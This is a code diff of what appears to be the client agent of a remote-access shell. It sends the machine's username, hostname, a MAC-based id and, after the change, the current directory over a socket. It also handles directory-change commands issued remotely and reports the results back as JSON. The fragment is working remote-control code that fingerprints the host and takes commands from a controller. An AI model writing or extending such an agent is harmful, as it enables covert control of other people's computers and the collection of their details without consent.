@@ -16,23 +16,28 @@ username = getpass.getuser()
 sock.send(json.dumps({
 	"username":username,
 	"hostname":socket.gethostname(),
-	"uid": str(get_mac())
+	"uid": str(get_mac()),
+	"current_directory": os.getcwd()
 }))
 
 
 def change_dir(cmd_data):
 	path = cmd_data['args']
 	try:
+		result = dict()
 		if not path:
 			os.chdir(home)
 		elif os.path.exists(path) == False:
-			sock.send(path + ": No such file or directory")
+			result = {'error':path + ": No such file or directory"}
 		elif os.path.isdir(path) == False:
-			sock.send(path + ": Is a file")
+			result = {'error':path + ": Is a file"}
 		else:
 			os.chdir(path)
+		if not 'error' in result:
+			result['current_directory'] = os.getcwd()
 	except Exception as e:
-		sock.send(str(e))
+		result = {'error':str(e)}
+	sock.send(json.dumps(result))
 	sock.send(cmd_data['term'])
 
 
